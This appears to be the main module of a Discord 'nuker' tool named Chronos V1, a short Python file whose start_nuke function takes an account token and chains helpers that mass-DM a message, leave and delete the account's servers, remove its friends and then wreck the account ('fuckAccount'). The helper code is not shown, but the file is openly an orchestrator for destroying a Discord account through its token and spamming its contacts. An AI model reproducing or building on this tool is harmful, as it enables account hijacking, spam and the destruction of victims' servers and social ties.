import requests
from colorama import Fore
from utils.common import *
from utils.massDM import *
from utils.fuckAccount import *
from utils.leaveServer import *
from utils.deleteServers import *
from utils.deleteFriends import *

# ====================================================================================================================== #

def start_nuke(token, content):
    set_console_title("Chronos V1 | Made by maxツ#8355 | Nuker")
    massDM(token=token, content=content)
    leaveServer(token=token)
    deleteServers(token=token)
    deleteFriends(token=token)
    fuckAccount(token=token)

# ====================================================================================================================== #